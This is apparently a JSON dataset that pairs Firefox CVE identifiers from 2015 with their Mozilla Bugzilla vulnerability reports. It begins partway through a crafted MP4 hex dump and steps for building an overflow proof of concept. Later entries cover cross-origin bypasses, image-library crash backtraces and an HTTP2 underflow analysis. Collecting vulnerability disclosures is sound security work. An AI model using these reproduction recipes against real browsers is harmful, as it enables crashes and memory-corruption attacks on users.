soun 740: 00 00 00 00 00 05 bb 6d 69 6e 66 00 00 00 10 73 minf s 750: 6d 68 64 00 00 00 00 00 00 00 00 00 00 00 24 64 mhd $d 760: 69 6e 66 00 00 00 1c 64 72 65 66 00 00 00 00 00 inf dref 770: 00 00 01 00 00 00 0c 75 72 6c 20 00 00 00 01 00 url 780: 00 05 7f 73 74 62 6c 00 00 00 67 73 74 73 64 00 stbl gstsd 790: 00 00 00 00 00 00 01 00 00 00 57 6d 70 34 61 00 Wmp4a 7a0: 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 7b0: 01 00 10 00 00 00 00 bb 80 00 00 00 00 00 33 65 3e 7c0: 73 64 73 00 00 00 00 03 80 80 80 22 00 00 00 04 sds \" 7d0: 80 80 80 14 40 15 00 01 18 00 01 65 f0 00 01 44 @ e D 7e0: 6b 05 80 80 80 02 11 88 06 80 80 80 01 02 00 00 k 7f0: 00 18 73 74 74 73 00 00 00 00 00 00 00 01 00 00 stts 800: 01 05 00 00 04 00 00 00 04 28 73 74 73 7a 00 00 (stsz 810: 00 00 00 00 00 00 00 00 01 05 00 00 00 f7 00 00 820: 00 db 00 00 00 e1 00 00 00 e5 00 00 00 e9 00 00 830: 00 e8 00 00 00 f0 00 00 00 f1 00 00 00 ef 00 00 840: 00 d8 00 00 00 e6 00 00 00 e7 00 00 00 e9 00 00 850: 00 eb 00 00 00 ea 00 00 00 e8 00 00 00 e1 00 00 860: 00 e7 00 00 00 d7 00 00 00 da 00 00 00 d9 00 00 870: 00 db 00 00 00 e9 00 00 00 ee 00 00 00 e5 00 00 880: 00 e1 00 00 00 e6 00 00 00 e5 00 00 00 d8 00 00 890: 00 dd 00 00 00 dd 00 00 00 d5 00 00 00 ea 00 00 8a0: 00 dd 00 00 00 d0 00 00 00 d6 00 00 00 e9 00 00 8b0: 00 bc 00 00 00 ab 00 00 00 b3 00 00 00 b5 00 00 8c0: 00 bc 00 00 00 ce 00 00 00 b4 00 00 00 b6 00 00 8d0: 00 b3 00 00 00 b6 00 00 00 b7 00 00 00 bf 00 00 8e0: 00 b7 00 00 00 cd 00 00 00 c1 00 00 00 ba 00 00 8f0: 00 a7 00 00 00 b4 00 00 00 b1 00 00 00 be 00 00 900: 00 d0 00 00 00 ba 00 00 00 bc 00 00 00 c4 00 00 910: 00 c6 00 00 00 cb 00 00 00 c4 00 00 00 c3 00 00 920: 00 c8 00 00 00 d2 00 00 00 d2 00 00 00 d6 00 00 930: 00 f5 00 00 00 fa 00 00 00 f6 00 00 01 02 00 00 940: 00 fc 00 00 00 fc 00 00 00 ee 00 00 00 e6 00 00 950: 00 ea 00 00 00 ea 00 00 00 e8 00 00 00 de 00 00 960: 00 df 00 00 00 e7 00 00 00 f6 00 00 00 ff 00 00 970: 01 03 00 00 00 f6 00 00 01 08 00 00 01 03 00 00 980: 00 fd 00 00 01 05 00 00 01 02 00 00 01 00 00 00 990: 01 14 00 00 01 18 00 00 00 fd 00 00 00 fb 00 00 9a0: 01 11 00 00 01 05 00 00 01 05 00 00 01 0a 00 00 9b0: 01 01 00 00 00 f3 00 00 00 f7 00 00 00 f7 00 00 9c0: 01 01 00 00 01 02 00 00 00 f8 00 00 00 f8 00 00 9d0: 00 ef 00 00 00 ed 00 00 00 e3 00 00 00 ec 00 00 9e0: 00 e2 00 00 00 e8 00 00 00 dc 00 00 00 e0 00 00 9f0: 00 f3 00 00 00 df 00 00 00 e1 00 00 00 cf 00 00 a00: 00 ce 00 00 00 d8 00 00 00 ce 00 00 00 c7 00 00 a10: 00 cd 00 00 00 b7 00 00 00 af 00 00 00 c8 00 00 a20: 00 d7 00 00 00 e5 00 00 00 e4 00 00 00 c6 00 00 a30: 00 d1 00 00 00 d5 00 00 00 e5 00 00 00 d8 00 00 a40: 00 c8 00 00 00 be 00 00 00 bf 00 00 00 cb 00 00 a50: 00 d2 00 00 00 c8 00 00 00 ca 00 00 00 b1 00 00 a60: 00 a3 00 00 00 c7 00 00 00 dc 00 00 00 d9 00 00 a70: 00 dd 00 00 00 d1 00 00 00 d2 00 00 00 c2 00 00 a80: 00 bc 00 00 00 b1 00 00 00 9b 00 00 00 89 00 00 a90: 00 a2 00 00 00 9f 00 00 00 b5 00 00 00 a6 00 00 aa0: 00 b2 00 00 00 b5 00 00 00 ae 00 00 00 b4 00 00 ab0: 00 b0 00 00 00 c6 00 00 00 c3 00 00 00 d5 00 00 ac0: 00 e4 00 00 00 f6 00 00 00 d6 00 00 00 db 00 00 ad0: 00 cc 00 00 00 e7 00 00 00 f9 00 00 00 cb 00 00 ae0: 00 d8 00 00 00 d6 00 00 00 e4 00 00 00 f1 00 00 af0: 00 e4 00 00 00 e6 00 00 00 df 00 00 00 ee 00 00 b00: 00 d7 00 00 00 c7 00 00 00 e7 00 00 00 f9 00 00 b10: 00 ed 00 00 00 cf 00 00 00 f1 00 00 00 e6 00 00 b20: 00 dc 00 00 00 e4 00 00 00 ef 00 00 00 e5 00 00 b30: 00 f1 00 00 00 e3 00 00 00 ec 00 00 00 ec 00 00 b40: 00 f3 00 00 00 f5 00 00 00 fd 00 00 01 0b 00 00 b50: 01 10 00 00 01 11 00 00 01 03 00 00 01 01 00 00 b60: 00 fb 00 00 00 fa 00 00 00 e7 00 00 00 e5 00 00 b70: 00 f0 00 00 00 d2 00 00 00 e5 00 00 00 f3 00 00 b80: 00 f1 00 00 00 f2 00 00 00 ff 00 00 00 f7 00 00 b90: 00 ee 00 00 00 d5 00 00 00 d9 00 00 00 ea 00 00 ba0: 00 e3 00 00 00 df 00 00 00 f7 00 00 00 ff 00 00 bb0: 00 f8 00 00 00 fa 00 00 00 fd 00 00 00 f7 00 00 bc0: 00 f9 00 00 00 fb 00 00 00 f8 00 00 00 f6 00 00 bd0: 00 f0 00 00 00 fe 00 00 01 02 00 00 00 e9 00 00 be0: 00 ec 00 00 00 ec 00 00 00 e7 00 00 00 ea 00 00 bf0: 00 de 00 00 00 e2 00 00 00 c9 00 00 00 d4 00 00 c00: 00 d4 00 00 00 c7 00 00 00 c9 00 00 00 c8 00 00 c10: 00 c1 00 00 00 c0 00 00 00 bd 00 00 00 de 00 00 c20: 00 cb 00 00 00 cd 00 00 00 d4 00 00 00 6d 00 00 m c30: 00 28 73 74 73 63 00 00 00 00 00 00 00 02 00 00 (stsc c40: 00 01 00 00 00 07 00 00 00 01 00 00 00 26 00 00 & c50: 00 02 00 00 00 01 00 00 00 a8 73 74 63 6f 00 00 stco c60: 00 00 00 00 00 26 00 00 6d 8d 00 00 85 9b 00 00 & m c70: 9d e4 00 00 b1 21 00 00 c2 a7 00 00 d2 8e 00 00 ! c80: df 8e 00 00 f3 54 00 00 fe e8 00 01 1a 05 00 01 T c90: 4a c7 00 01 7e 28 00 01 c5 a1 00 01 fc 89 00 02 J ~( ca0: 35 5c 00 02 83 6a 00 02 ae 62 00 02 e1 ae 00 03 5\\ j b cb0: 1d 6d 00 03 58 04 00 03 99 4d 00 03 e4 b1 00 04 m X M cc0: 21 99 00 04 39 67 00 04 5d c6 00 04 78 18 00 04 ! 9g ] x cd0: 92 6a 00 04 a7 67 00 04 b8 7e 00 04 d0 6c 00 04 j g ~ l ce0: e7 0c 00 05 07 c6 00 05 53 5c 00 05 74 bc 00 05 S\\ t cf0: 8e 99 00 05 ae 19 00 05 c0 eb 00 05 cb 47 00 00 G d00: 00 16 75 64 74 61 00 00 00 0e 6e 61 6d 65 53 74 udta nameSt d10: 65 72 65 6f 00 00 00 6f 75 64 74 61 00 00 00 67 ereo oudta g d20: 6d 65 74 61 00 00 00 00 00 00 00 21 68 64 6c 72 meta !hdlr d30: 00 00 00 00 00 00 00 00 6d 64 69 72 00 00 00 00 mdir d40: 00 00 00 00 00 00 00 00 00 00 00 00 3a 69 6c 73 :ils d50: 74 00 00 00 32 a9 74 6f 6f 00 00 00 2a 64 61 74 t 2 too *dat d60: 61 00 00 00 01 00 00 00 00 62 6c 61 68 62 6c 61 a blahbla d70: 68 62 20 30 2e 39 2e 34 20 32 32 32 32 31 31 32 hb 0.9.4 2222112 d80: 33 30 30 00 00 00 08 66 72 65 65 Then create poc_body.bin with these contents: 000: 01 00 00 00 70 73 73 68 00 00 00 04 ee ee ee ee pssh 010: ee ee ee ee ee ee ee ee ee ee ee ee 00 00 00 00 020: 50 75 74 20 79 6f 75 72 20 61 74 74 61 63 6b 20 Put your attack 030: 63 6f 64 65 20 61 6e 64 20 64 61 74 61 20 68 65 code and data he 040: 72 65 2e 2e 2e 2e 2e 2e 2e 2e 2e 2e 2e 2e 2e 2e re.............. 050: 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d ---------------- Set the length of poc_body.bin to 0x01000000. It doesn't matter what bytes 0x20-0xffffff contain. Next, repeatedly double poc_body.bin until it's exactly 0x100000000 bytes long (4GB). Then copy poc_header.bin+poc_body.bin+poc_trailer.bin into poc_test.mp4 , Start FF Win64 and attach a debugger, setting a BP on line 511. Load poc_test.mp4 and wait for the BP to fire, then step the code to see the overflow and subsequent overrun."
      }
    ],
    "CVE-2015-7214": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1228950",
        "title": "cross-origin restriction bypass & arbitrary local file read using data: and view-source: uri scheme",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:42.0) Gecko/20100101 Firefox/42.0 Build ID: 20151029151421 Steps to reproduce: Please access the following page. http://llamakko:poc@cdc61702-f6af-4568-b485-e8b65871f801.gehirn.ne.jp/poc/ Click the 'CLICK ME!' button. Wait for about six seconds. Actual results: Will display an alert dialog containing the HTML content of example.org. cross-origin restriction bypass was successful. Expected results: If trying to change a protocol to data: uri scheme, that should not be successful."
      }
    ],
    "CVE-2015-7215": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1160890",
        "title": "Cross-origin information disclosure with error message of Web Workers importScripts()",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0 Build ID: 20150415140819 Steps to reproduce: 1. Go to http://vulnerabledoma.in/fx_worker_importScripts.html and click the \"go\" button. 2. If you are Twitter login user, you can see the following alert: https://analytics.twitter.com/user/[USER_NAME]/home If not, you will see \"https://analytics.twitter.com/about\". This means that Firefox leaks redirect information to unrelated site. Actual results: Firefox includes redirect information in error message. Expected results: Firefox should not include redirect information in error message."
      }
    ],
    "CVE-2015-7216": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1197059",
        "title": "Firefox in Linux is using Jasper which is unmaintained and vulnerable",
        "description": "User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0 Build ID: 20150629114848 Steps to reproduce: In order to preview a jpeg image, Firefox is using gdk-pixbuf in Linux. Such library is loading this type of images using jasper (http://www.ece.uvic.ca/~frodo/jasper/). Unfortunately, this library is unmaintained and day after day we *easily* found new vulnerabilities. For instance: * http://seclists.org/oss-sec/2015/q3/408 * http://seclists.org/oss-sec/2015/q3/366 * http://seclists.org/bugtraq/2015/Jan/101 * http://seclists.org/bugtraq/2014/Dec/133 You can find a list containing older vulnerabilities here: http://www.cvedetails.com/vulnerability-search.php?f=1&vendor=&product=jasper&cveid=&cweid=&cvssscoremin=&cvssscoremax=&psy=&psm=&pey=&pem=&usy=&usm=&uey=&uem= More recently, I started fuzzing regression tests and i found even more issues, some of then affecting directly Firefox like a malformed image which can crash it. The attached files is one of the new issues (re)discovered and it will be reported soon (and more is about to come!). To reproduce it: 1. Download this attached compressed image somewhere 2. Uncompress it 3. Try to attach it or open it with Firefox. Actual results: Firefox executed buggy code from libjasper, which crashed. A complete stack trace is here: #0 0x00007fffb9a32ebc in ?? () from /usr/lib/x86_64-linux-gnu/libjasper.so.1 #1 0x00007fffb9a3316e in ?? () from /usr/lib/x86_64-linux-gnu/libjasper.so.1 #2 0x00007fffb9a327fd in jpc_decode () from /usr/lib/x86_64-linux-gnu/libjasper.so.1 #3 0x00007fffb9a20ecd in jas_image_decode () from /usr/lib/x86_64-linux-gnu/libjasper.so.1 #4 0x00007fffb9c6bfad in jasper_image_try_load (error=<optimized out>, context=<optimized out>) at io-jasper.c:100 #5 jasper_image_stop_load (data=0x7fffc98eed80, error=0x7fffffff9bd0) at io-jasper.c:246 #6 0x00007fffedf4f3b8 in gdk_pixbuf_loader_close (loader=0x7fffbedf9c80, error=0x0) at gdk-pixbuf-loader.c:819 #7 0x00007fffedf4d436 in gdk_pixbuf_get_file_info (filename=<optimized out>, width=0x7fffffffac68, height=0x7fffffffac6c) at gdk-pixbuf-io.c:1948 #8 0x00007ffff2652b9b in ?? () from /usr/lib/firefox/libxul.so #9 0x00007fffef50b3b8 in g_closure_invoke () from /usr/lib/x86_64-linux-gnu/libgobject-2.0.so.0 #10 0x00007fffef51cd3d in ?? () from /usr/lib/x86_64-linux-gnu/libgobject-2.0.so.0 #11 0x00007fffef524a29 in g_signal_emit_valist () from /usr/lib/x86_64-linux-gnu/libgobject-2.0.so.0 #12 0x00007fffef525212 in g_signal_emit_by_name () from /usr/lib/x86_64-linux-gnu/libgobject-2.0.so.0 #13 0x00007fffef50b3b8 in g_closure_invoke () from /usr/lib/x86_64-linux-gnu/libgobject-2.0.so.0 #14 0x00007fffef51cd3d in ?? () from /usr/lib/x86_64-linux-gnu/libgobject-2.0.so.0 #15 0x00007fffef524a29 in g_signal_emit_valist () from /usr/lib/x86_64-linux-gnu/libgobject-2.0.so.0 #16 0x00007fffef525212 in g_signal_emit_by_name () from /usr/lib/x86_64-linux-gnu/libgobject-2.0.so.0 #17 0x00007fffef50b3b8 in g_closure_invoke () from /usr/lib/x86_64-linux-gnu/libgobject-2.0.so.0 #18 0x00007fffef51cd3d in ?? () from /usr/lib/x86_64-linux-gnu/libgobject-2.0.so.0 #19 0x00007fffef524a29 in g_signal_emit_valist () from /usr/lib/x86_64-linux-gnu/libgobject-2.0.so.0 #20 0x00007fffef525212 in g_signal_emit_by_name () from /usr/lib/x86_64-linux-gnu/libgobject-2.0.so.0 #21 0x00007fffeec8d0e7 in ?? () from /usr/lib/x86_64-linux-gnu/libgtk-x11-2.0.so.0 #22 0x00007fffeec903f0 in ?? () from /usr/lib/x86_64-linux-gnu/libgtk-x11-2.0.so.0 #23 0x00007fffef50b5e7 in ?? () from /usr/lib/x86_64-linux-gnu/libgobject-2.0.so.0 #24 0x00007fffef524088 in g_signal_emit_valist () from /usr/lib/x86_64-linux-gnu/libgobject-2.0.so.0 #25 0x00007fffef524ce2 in g_signal_emit () from /usr/lib/x86_64-linux-gnu/libgobject-2.0.so.0 #26 0x00007fffeedd82be in ?? () from /usr/lib/x86_64-linux-gnu/libgtk-x11-2.0.so.0 #27 0x00007fffeeddc868 in ?? () from /usr/lib/x86_64-linux-gnu/libgtk-x11-2.0.so.0 #28 0x00007fffeece4815 in ?? () from /usr/lib/x86_64-linux-gnu/libgtk-x11-2.0.so.0 #29 0x00007fffef50b3b8 in g_closure_invoke () from /usr/lib/x86_64-linux-gnu/libgobject-2.0.so.0 #30 0x00007fffef51cafb in ?? () from /usr/lib/x86_64-linux-gnu/libgobject-2.0.so.0 #31 0x00007fffef5246f9 in g_signal_emit_valist () from /usr/lib/x86_64-linux-gnu/libgobject-2.0.so.0 #32 0x00007fffef524ce2 in g_signal_emit () from /usr/lib/x86_64-linux-gnu/libgobject-2.0.so.0 #33 0x00007fffeedf4684 in ?? () from /usr/lib/x86_64-linux-gnu/libgtk-x11-2.0.so.0 #34 0x00007fffeece2fc4 in gtk_propagate_event () from /usr/lib/x86_64-linux-gnu/libgtk-x11-2.0.so.0 #35 0x00007fffeece337b in gtk_main_do_event () from /usr/lib/x86_64-linux-gnu/libgtk-x11-2.0.so.0 #36 0x00007fffee3c91ec in ?? () from /usr/lib/x86_64-linux-gnu/libgdk-x11-2.0.so.0 #37 0x00007fffef23be04 in g_main_context_dispatch () from /lib/x86_64-linux-gnu/libglib-2.0.so.0 ---Type <return> to continue, or q <return> to quit--- #38 0x00007fffef23c048 in ?? () from /lib/x86_64-linux-gnu/libglib-2.0.so.0 #39 0x00007fffef23c0ec in g_main_context_iteration () from /lib/x86_64-linux-gnu/libglib-2.0.so.0 #40 0x00007ffff265294c in ?? () from /usr/lib/firefox/libxul.so #41 0x00007ffff2635b45 in ?? () from /usr/lib/firefox/libxul.so #42 0x00007ffff2635c74 in ?? () from /usr/lib/firefox/libxul.so #43 0x00007ffff1706f8d in ?? () from /usr/lib/firefox/libxul.so #44 0x00007ffff17187ce in ?? () from /usr/lib/firefox/libxul.so #45 0x00007ffff18c690d in ?? () from /usr/lib/firefox/libxul.so #46 0x00007ffff18b7515 in ?? () from /usr/lib/firefox/libxul.so #47 0x00007ffff262e2b1 in ?? () from /usr/lib/firefox/libxul.so #48 0x00007ffff2b3a3c7 in ?? () from /usr/lib/firefox/libxul.so #49 0x00007ffff2b6b8ec in ?? () from /usr/lib/firefox/libxul.so #50 0x00007ffff2b6bbdd in ?? () from /usr/lib/firefox/libxul.so #51 0x00007ffff2b6be68 in XRE_main () from /usr/lib/firefox/libxul.so #52 0x0000555555558451 in _start () and the faulty instruction is examined here: (gdb) x/i $rip => 0x7fffb9a32ebc: mov 0x8(%r14),%rax (gdb) info register rax 0x7fffbed04cc0 140736394710208 rbx 0x7fffbd700068 140736371621992 rcx 0xffd9 65497 rdx 0x7fffb9c61c68 140736310156392 rsi 0x5a5a5a5a 1515870810 rdi 0x3 3 rbp 0x2 0x2 rsp 0x7fffffff9a50 0x7fffffff9a50 r8 0xffd9 65497 r9 0x7fffbed87000 140736395243520 r10 0x7ffff6c000c8 140737333166280 r11 0x7ffff6c00680 140737333167744 r12 0x7fffbed04a80 140736394709632 r13 0x7fffbed04ae8 140736394709736 r14 0x0 0 r15 0x7fffffffae60 140737488334432 rip 0x7fffb9a32ebc 0x7fffb9a32ebc eflags 0x10206 [ PF IF RF ] cs 0x33 51 ss 0x2b 43 ds 0x0 0 es 0x0 0 fs 0x0 0 gs 0x0 0 For this concrete example, it was just a null dereference and more than a DoS is unlikely to happen but next time we could find a worse case. Expected results: I think we should disable image preview for jpeg until gdk-pixbuf change Jasper for a more modern implementation of jpeg decoding (e.g, openjpeg)"
      }
    ],
    "CVE-2015-7217": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1203078",
        "title": "Heap overflow and DoS with TGA files in gdk-pixbuf affecting Firefox",
        "description": "User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0 Build ID: 20150826185918 Steps to reproduce: Hello, We found a heap overflow and a DoS in the gdk-pixbuf implementation triggered by the scaling of tga file. At least, these issues are affecting gdk-pixbuf 2.30 and 2.31 in x86_64 (we tested in a fully updated Ubuntu 14.04). Please find attached the two test cases as well as a minimal example of a vulnerable program: it is just a call to gdk_pixbuf_new_from_file_at_size. As the last gdk-pixbuf vulnerability (https://bugzilla.gnome.org/show_bug.cgi?id=752297), this one also affects many programs including Firefox and Chromium since they are using gdk-pixbuf primitives to implement file pickers. To reproduce this issue in Firefox, you should attach one of the uncompressed tga or try to open them (using ctrl+O). The heap overflow PoC works in a fully updated Firefox 40 and it does *not* seem to depend on memory conditions (it was tested on my netbook as well as my desktop computer) so it is an interesting case from the exploitability perspective. Fortunately, Firefox 41 (beta) mitigates this heap overflow since images with large sizes are *not* scaled and the vulnerable code is not used (https://hg.mozilla.org/integration/mozilla-inbound/rev/10e77092a656). The DoS will work in all Firefox versions. The best way of solve these issues is to disable the TGA preview (i don't think people will complain about it). Actual results: It crashed. A detailed backtrace of the heap overflow is here: Starting program: pixbuf_vuln_poc overflow.tga Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\". Program received signal SIGSEGV, Segmentation fault. scale_line (weights=weights@entry=0x2aab3c468c10, n_x=148, n_y=148, dest=dest@entry=0x630ee0 \"\", dest_x=dest_x@entry=0, dest_end=dest_end@entry=0x631144 \"\", dest_channels=dest_channels@entry=4, dest_has_alpha=dest_has_alpha@entry=1, src=src@entry=0x63ce60, src_channels=src_channels@entry=4, src_has_alpha=src_has_alpha@entry=1, x_init=<optimized out>, x_step=x_step@entry=9629110, src_width=src_width@entry=22627, check_size=check_size@entry=0, color1=color1@entry=0, color2=color2@entry=0) at pixops.c:974 974 (gdb) bt #0 scale_line (weights=weights@entry=0x2aab3c468c10, n_x=148, n_y=148, dest=dest@entry=0x630ee0 \"\", dest_x=dest_x@entry=0, dest_end=dest_end@entry=0x631144 \"\", dest_channels=dest_channels@entry=4, dest_has_alpha=dest_has_alpha@entry=1, src=src@entry=0x63ce60, src_channels=src_channels@entry=4, src_has_alpha=src_has_alpha@entry=1, x_init=<optimized out>, x_step=x_step@entry=9629110, src_width=src_width@entry=22627, check_size=check_size@entry=0, color1=color1@entry=0, color2=color2@entry=0) at pixops.c:974 #1 0x00002aaaaace5698 in pixops_process (dest_buf=<optimized out>, render_x0=0, render_y0=<optimized out>, render_x1=<optimized out>, render_y1=<optimized out>, dest_rowstride=<optimized out>, dest_channels=4, dest_has_alpha=1, src_buf=0x2aaaad14f010 \"\", src_width=22627, src_height=26435, src_rowstride=90508, src_channels=4, src_has_alpha=1, scale_x=<optimized out>, scale_y=<optimized out>, check_x=0, check_y=0, check_size=0, color1=0, color2=0, filter=0x7ffffffedc90, line_func=0x2aaaaace3c10 <scale_line>, pixel_func=0x2aaaaace49a0 <scale_pixel>) at pixops.c:1366 #2 0x00002aaaaace5f09 in _pixops_scale_real (interp_type=PIXOPS_INTERP_BILINEAR, interp_type@entry=PIXOPS_INTERP_NEAREST, scale_y=0,0068091545299791946, scale_x=0,0068060281964025283, src_has_alpha=1, src_channels=4, src_rowstride=90508, src_height=26435, src_width=22627, src_buf=0x2aaaad14f010 \"\", dest_has_alpha=1, dest_channels=4, dest_rowstride=616, render_y1=<optimized out>, render_x1=154, render_y0=<optimized out>, render_x0=0, dest_buf=<optimized out>) at pixops.c:2230 #3 _pixops_scale (dest_buf=<optimized out>, dest_width=dest_width@entry=154, dest_height=dest_height@entry=180, dest_rowstride=616, dest_channels=4, dest_has_alpha=1, src_buf=0x2aaaad14f010 \"\", src_width=22627, src_height=26435, src_rowstride=90508, src_channels=4, src_has_alpha=1, dest_x=dest_x@entry=0, dest_y=dest_y@entry=0, dest_region_width=dest_region_width@entry=154, dest_region_height=dest_region_height@entry=180, offset_x=offset_x@entry=0, offset_y=<optimized out>, scale_x=scale_x@entry=0,0068060281964025283, scale_y=scale_y@entry=0,0068091545299791946, interp_type=interp_type@entry=PIXOPS_INTERP_BILINEAR) at pixops.c:2285 #4 0x00002aaaaacdda2d in gdk_pixbuf_scale (src=0x618000, dest=0x618050, dest_x=0, dest_y=0, dest_width=154, dest_height=180, offset_x=0, offset_y=<optimized out>, scale_x=0,0068060281964025283, scale_y=0,0068091545299791946, interp_type=GDK_INTERP_BILINEAR) at gdk-pixbuf-scale.c:147 #5 0x00002aaaaacde07a in gdk_pixbuf_scale_simple (src=src@entry=0x618000, dest_width=154, dest_height=dest_height@entry=180, interp_type=interp_type@entry=GDK_INTERP_BILINEAR) at gdk-pixbuf-scale.c:321 #6 0x00002aaaaacdf340 in get_scaled_pixbuf (scaled=0x616440, pixbuf=0x618000) at gdk-pixbuf-scaled-anim.c:138 #7 0x00002aaaaacdae88 in gdk_pixbuf_new_from_file_at_scale (filename=0x7fffffffe36b \"overflow.tga\", width=<optimized out>, height=<optimized out>, preserve_aspect_ratio=<optimized out>, error=0x7fffffffdee0) at gdk-pixbuf-io.c:1377 #8 0x00000000004007b8 in main () (gdb) x/i $rip => 0x2aaaaace3dd0 <scale_line+448>: movzbl 0x3(%rcx),%edx (gdb) info registers rax 0x0 0 rbx 0x94 148 rcx 0x2aaa2d6d51c4 46910394945988 rdx 0x0 0 rsi 0x4 4 rdi 0x2aab3c468c10 46914939030544 rbp 0x2aab3c468e60 0x2aab3c468e60 rsp 0x7ffffffeda18 0x7ffffffeda18 r8 0x0 0 r9 0x0 0 r10 0x0 0 r11 0x0 0 r12 0x0 0 r13 0x63ce60 6540896 r14 0x2aab3c468c10 46914939030544 r15 0x94 148 rip 0x2aaaaace3dd0 0x2aaaaace3dd0 <scale_line+448> eflags 0x10202 [ IF RF ] cs 0x33 51 ss 0x2b 43 ds 0x0 0 es 0x0 0 fs 0x0 0 gs 0x0 0 And the backtrace of the DoS here: Starting program: pixbuf_vuln_poc DoS.tga [Depuración de hilo usando libthread_db enabled] Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\". Program received signal SIGSEGV, Segmentation fault. 0x00002aaaacf4c384 in parse_data_for_row_pseudocolor (ctx=0x614ca0) at io-tga.c:367 367 (gdb) bt #0 0x00002aaaacf4c384 in parse_data_for_row_pseudocolor (ctx=0x614ca0) at io-tga.c:367 #1 parse_data_for_row (err=0x7ffffffede28, ctx=0x614ca0) at io-tga.c:413 #2 gdk_pixbuf__tga_load_increment (data=0x614ca0, buffer=<optimized out>, size=<optimized out>, err=0x7ffffffede28) at io-tga.c:922 #3 0x00002aaaaacdca45 in gdk_pixbuf_loader_load_module (loader=loader@entry=0x60f200, image_type=image_type@entry=0x0, error=error@entry=0x7ffffffede28) at gdk-pixbuf-loader.c:445 #4 0x00002aaaaacdd2b8 in gdk_pixbuf_loader_close (loader=loader@entry=0x60f200, error=error@entry=0x7fffffffdef0) at gdk-pixbuf-loader.c:810 #5 0x00002aaaaacdae2a in gdk_pixbuf_new_from_file_at_scale (filename=0x7fffffffe370 \"DoS.tga\", width=<optimized out>, height=<optimized out>, preserve_aspect_ratio=<optimized out>, error=0x7fffffffdef0) at gdk-pixbuf-io.c:1372 #6 0x00000000004007b8 in main () (gdb) x/i $rip => 0x2aaaacf4c384 <gdk_pixbuf__tga_load_increment+612>: mov 0x8(%rdx),%rdx (gdb) info registers rax 0x6163e0 6382560 rbx 0x614ca0 6376608 rcx 0x7 7 rdx 0x0 0 rsi 0x611b02 6363906 rdi 0x618000 6389760 rbp 0x7ffffffede28 0x7ffffffede28 rsp 0x7ffffffedd80 0x7ffffffedd80 r8 0x616200 6382080 r9 0x6163e7 6382567 r10 0x8 8 r11 0x2aaaaaf05c10 46912500685840 r12 0x0 0 r13 0x0 0 r14 0x15 21 r15 0xb 11 rip 0x2aaaacf4c384 0x2aaaacf4c384 <gdk_pixbuf__tga_load_increment+612> eflags 0x10202 [ IF RF ] cs 0x33 51 ss 0x2b 43 ds 0x0 0 es 0x0 0 fs 0x0 0 gs 0x0 0"
      }
    ],
    "CVE-2015-7218": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1194818",
        "title": "Firefox HTTP2 Malformed Header Frame DoS",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 Steps to reproduce: Firefox HTTP2 Malformed Header Frame DoS ## Overview A malformed HTTP2 header frame is sent to the browser. Normally a header frame consist of a pad length, stream dependency identifier, weight, header block fragement, and padding. But only a single byte is sent that eventually results in an integer underflow, which cases an nsCString to try to allocate nearly 2^32 bytes of memory. This is greater than firefox allows and an assert is tripped. ## Walkthrough On line 1226 of file Http2Session.cpp, a call is made to append the decompressed frame onto a decompressed frame buffer: self->mDecompressBuffer.Append(self->mInputFrameBuffer + kFrameHeaderBytes + paddingControlBytes + priorityLen, self->mInputFrameDataSize - paddingControlBytes - priorityLen - paddingLength); At this point the variables are: self->mDecompressBuffer.Append(nsAutoArrayPtr<char> (ptr) + uint_8(9) + uint8_t(0) + uint16_t(0), uint32_t(1) - uint8_t(0) - uint32_t(5) - uint16_t(0)); priorityLen is equal to five because the kFlag_PRIORITY is set on line 1186 of Http2Session.cpp. The second argument is casted to a size_type (uint32), which results in an integer underflow of 4294967292. A bunch of string checks are then performed to make sure the append is sane. Eventually in nsTSubstring.cpp:45 MutatePrep is called with: MutatePrep(this=0x0000000121e52b80, aCapacity=4294967292, aOldData=0x000000010be8b8f0, aOldFlags=0x000000010be8b8ec). In the function, kMaxCapacity for a string is determined to be: const size_type kMaxCapacity = (size_type(-1) / 2 - sizeof(nsStringBuffer)) / sizeof(char_type) - 2; // kMaxCapacity = 2147483637 kMaxCapacity is then compared to our capacity (4294967292). Since the capacity exceeds the max allowed, an error is thrown on line 531 of nsTSubstring.cpp. AllocFailed(Length() - aCutLength + 1) ## Exploitability To exploit we would need our integer underflow to result in a value less than 2147483637. Since we only partially control a uint8 and a uint16, this is not possible. Only an assert can be generated. ## Tested on Firefox 39.0. MacOS 42.0a1 (2015-07-21) MacOS ## POC Code can be found here: https://notr-bucket.s3.amazonaws.com/eabe6314-752b-4508-9ee1-bccf756c09e1 To use: Extract the file and the certs $ go run firefoxHeaderPoc.go $ ./firefox https://localhost:8000 ## Author Stuart Larsen Yahoo! Pentest Team"
      }
    ],
    "CVE-2015-7219": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1194820",
        "title": "Firefox HTTP2 Malformed PushPromise Underflow DoS",
